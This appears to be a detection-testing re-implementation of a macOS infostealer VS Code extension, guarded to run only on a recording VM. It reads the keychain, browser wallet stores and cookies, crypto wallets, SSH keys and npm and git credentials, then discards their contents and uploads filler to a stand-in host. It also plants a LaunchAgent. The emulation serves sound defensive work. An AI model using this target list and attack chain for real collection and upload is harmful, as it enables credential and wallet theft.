// The extension's payload on a Mac, re-implemented from the public analysis
// (../../README.md) so that a sensor on the machine sees what it saw of the
// real one: the editor's extension process opening the same files, writing
// the same kind of staging folder, starting osascript for its shell
// commands, the upload, the LaunchAgent. What a sensor cannot see is not
// done: every file is read and its content dropped, the staging folder and
// the archive hold filler of the same lengths, and the upload is filler.
//
// The real one is encrypted inside the extension and hidden; this is plain.
//
// It runs only on a recording VM, and stops at once anywhere else.
const { execFile } = require("node:child_process");
const crypto = require("node:crypto");
const dns = require("node:dns/promises");
const fs = require("node:fs");
const https = require("node:https");
const os = require("node:os");
const path = require("node:path");

const HOST = "sync.icons-cdn.example";
const LEDGER = "https://api.mainnet-beta.solana.com";
const WAIT = 20_000; // the real one waits 15 minutes
const HOME = os.homedir();
const SUPPORT = path.join(HOME, "Library/Application Support");
const STAGE = "/tmp/qvkda";
const AGENT = path.join(HOME, "Library/LaunchAgents/com.acme.fileicons.sync.plist");

// A recording VM says it is one (vm/provision.sh writes the file), and the
// server's name there is the stand-in on the host, a private address. Both,
// or nothing below runs.
async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) return false;
  const { address } = await dns.lookup(HOST, 4);
  return /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address);
}

const list = (dir) => {
  try {
    return fs.readdirSync(dir);
  } catch {
    return [];
  }
};

// A file is opened and read as the real one reads it, and its content
// dropped; what goes into the staging folder under its name is random bytes
// of the same length.
function take(file) {
  let bytes;
  try {
    bytes = fs.readFileSync(file).length;
  } catch {
    return;
  }
  const to = path.join(STAGE, path.relative(HOME, file));
  fs.mkdirSync(path.dirname(to), { recursive: true });
  fs.writeFileSync(to, crypto.randomBytes(bytes));
}
const takeAll = (dir) => list(dir).forEach((f) => take(path.join(dir, f)));

// The stand-in's certificate is signed by the VM's own authority, which this
// process may not read from the keychain; no sensor sees the option.
function request(url, body) {
  return new Promise((done) => {
    const req = https.request(url, { method: body ? "POST" : "GET", rejectUnauthorized: false,
      headers: body ? { "content-type": "application/json", "content-length": body.length } : {} },
      (res) => res.resume().on("end", done));
    req.on("error", done);
    req.end(body);
  });
}

// The real one's shell commands go through AppleScript.
const shell = (command) => new Promise((done) =>
  execFile("osascript", ["-e", `do shell script ${JSON.stringify(command)}`], () => done()));

// 1. The login keychain, the wallet extensions' stores and cookies of each
//    browser, the desktop wallets, and the developer's credentials: the npm
//    token, the SSH keys, git's saved credentials, the editor's own storage.
function collect() {
  take(path.join(HOME, "Library/Keychains/login.keychain-db"));
  for (const browser of ["Google/Chrome", "BraveSoftware/Brave-Browser", "Microsoft Edge"]) {
    const root = path.join(SUPPORT, browser);
    for (const profile of list(root).filter((d) => d === "Default" || d.startsWith("Profile "))) {
      const stores = path.join(root, profile, "Local Extension Settings");
      for (const id of list(stores)) takeAll(path.join(stores, id));
      take(path.join(root, profile, "Cookies"));
    }
  }
  const firefox = path.join(SUPPORT, "Firefox/Profiles");
  for (const profile of list(firefox)) take(path.join(firefox, profile, "cookies.sqlite"));
  takeAll(path.join(SUPPORT, "Exodus/exodus.wallet"));
  takeAll(path.join(HOME, ".electrum/wallets"));
  take(path.join(HOME, ".npmrc"));
  takeAll(path.join(HOME, ".ssh"));
  take(path.join(HOME, ".git-credentials"));
  take(path.join(SUPPORT, "Code/User/globalStorage/state.vscdb"));
}

// 2. A LaunchAgent, so that it comes back at the next login. The analysis
//    does not say what the real one's agent runs; this one runs
//    /usr/bin/true, and is written but not loaded.
function persist() {
  fs.mkdirSync(path.dirname(AGENT), { recursive: true });
  fs.writeFileSync(AGENT, `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.acme.fileicons.sync</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/true</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
`);
}

async function main() {
  if (!(await guard())) return;
  await new Promise((r) => setTimeout(r, WAIT));
  // where the server is: the real one reads its address from a note on a
  // public ledger. This asks the ledger's public endpoint whether it is up.
  await request(LEDGER, Buffer.from('{"jsonrpc":"2.0","id":1,"method":"getHealth"}'));
  // the next stage: the real one's answer is run; this one's is empty
  await request(`https://${HOST}/`);
  collect();
  // a named keychain item, asked of the security tool (there is none by this
  // name on the VM, and the answer is not read)
  await shell("security find-generic-password -s 'Acme Wallet' -w");
  await shell(`zip -qr ${STAGE}.zip ${STAGE}`);
  let bytes = 0;
  try {
    bytes = fs.statSync(`${STAGE}.zip`).size;
  } catch {}
  await request(`https://${HOST}/p`, Buffer.alloc(bytes, "x"));
  persist();
  // hardware wallets' apps: looked for, and replaced where found (none is on the VM)
  for (const app of ["Ledger Live.app", "Trezor Suite.app"]) fs.existsSync(path.join("/Applications", app));
}

exports.activate = () => {
  main().catch(() => {});
};
exports.deactivate = () => {};
